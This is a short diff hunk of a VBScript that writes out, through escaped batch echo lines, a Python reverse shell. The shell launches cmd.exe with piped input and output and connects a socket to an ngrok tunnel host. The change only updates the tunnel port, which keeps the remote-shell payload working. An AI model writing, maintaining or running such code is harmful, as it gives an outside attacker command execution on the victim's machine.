@@ -17,7 +17,7 @@ If objShell.Exec("cmd /c echo %ERRORLEVEL%").StdOut.ReadAll = "1" Then
     objFile.WriteLine "        echo def rev^(^)^:"
     objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)^"
     objFile.WriteLine "        echo    s = socket.socket^(^)^"
-    objFile.WriteLine "        echo    s.connect^(('0.tcp.eu.ngrok.io', 17454^)^)^"
+    objFile.WriteLine "        echo    s.connect^(('0.tcp.eu.ngrok.io', 14276^)^)^"
     objFile.WriteLine "        echo.^"
     objFile.WriteLine "        echo    def s_o^(^)^:"
     objFile.WriteLine "        echo        while True^:"
